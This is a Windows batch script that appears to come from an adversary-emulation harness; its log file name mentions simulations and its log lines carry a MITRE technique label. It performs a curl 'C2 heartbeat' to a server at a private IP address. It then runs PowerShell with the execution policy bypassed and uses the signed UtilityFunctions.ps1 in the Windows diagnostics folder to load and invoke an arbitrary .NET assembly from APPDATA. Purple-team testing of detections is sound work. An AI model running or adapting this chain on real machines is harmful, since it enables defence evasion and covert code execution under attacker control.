@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET pjkcpgw=%APPDATA%\8468\97e42c7a
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?8468-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=expressvp.txt
SET ewjmdkff=8468

REM Script variables
SET zxddff=%APPDATA%\!pudaazx!\macula-simulations.log
SET qwmnb=%APPDATA%\!pudaazx!

REM 1. C2 HEARTBEAT
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: heartbeat_start=>> "%zxddff%" 2>nul
curl -k -s -o nul "!drguvr!"
SET vbjhuy=%errorlevel%
IF !vbjhuy! EQU 0 (SET xcvbmk=1 & SET tyuio=) ELSE (SET xcvbmk=0 & SET tyuio=connection_failed_!vbjhuy!)
echo [%DATE% %TIME%][!hlbnp!]: !pudaazx!-!ewjmdkff!-T1218|Signed Binary Proxy Execution=!xcvbmk!:!tyuio!>> "%zxddff%" 2>nul
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: heartbeat_end=!xcvbmk!>> "%zxddff%" 2>nul

REM 2. Directory change for execution
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: chdir_start=c:\windows\diagnostics\system\networking>> "%zxddff%" 2>nul
cd /d c:\windows\diagnostics\system\networking
SET poiuyt=%errorlevel%
IF !poiuyt! EQU 0 (SET lkjhg=1) ELSE (SET lkjhg=0)
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: chdir_end=!lkjhg!>> "%zxddff%" 2>nul

REM 3. Execute .NET DLL via PowerShell wrapper
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: powershell_exec_start=>> "%zxddff%" 2>nul
powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin '!pjkcpgw!\\!syjfr!';[Program.Class]::Dale()"
SET mnbvc=%errorlevel%
IF !mnbvc! EQU 0 (SET asdfg=1 & SET zxcvd=) ELSE (SET asdfg=0 & SET zxcvd=assembly_load_failed)
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: powershell_exec_end=!asdfg!>> "%zxddff%" 2>nul

ENDLOCAL